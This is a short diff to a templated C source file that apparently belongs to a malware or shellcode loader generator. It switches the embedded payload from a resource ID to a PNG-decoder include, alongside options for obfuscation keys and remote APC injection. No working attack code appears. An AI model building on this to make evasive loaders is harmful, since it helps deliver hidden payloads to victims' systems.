@@ -16,7 +16,11 @@
 #define OBFUSCATION_KEY {{ obfuscation_key }}
 {% endif %}
 {% if data_source == 'embedded' %}
-#define PAYLOAD_RESOURCE_ID   101
+#define RPNG_IMPLEMENTATION
+#define RPNG_NO_STDIO
+#define RPNG_DEFLATE_IMPLEMENTATION
+
+{% include 'partials/rpng.h' %}
 {% endif %}
 
 // --- Module handle definition ---
@@ -36,6 +40,7 @@ char debug_buffer[512];
 {% if execution_method == 'remoteapc' %}
 #define JobObjectFreezeInformation 18
 {% endif %}
+
 // --- DYNAMICALLY INCLUDE PARTIALS ---
 {% if string_obfuscation_needed %}
     {% include 'partials/deobfuscate_string.c.j2' %}
